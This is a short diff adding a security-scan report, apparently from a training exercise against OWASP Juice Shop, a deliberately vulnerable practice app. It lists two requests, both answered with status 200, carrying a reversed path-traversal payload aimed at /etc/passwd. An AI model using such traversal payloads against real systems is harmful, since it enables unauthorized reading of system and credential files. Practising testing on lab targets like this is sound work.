@@ -1,0 +1,9 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=dwssap
+
+[STATUS]: 200
+[PAYLOAD]: dwssap/cte/../../..
+---
+[STATUS]: 200
+[PAYLOAD]: dwssap/cte/../../..
+---
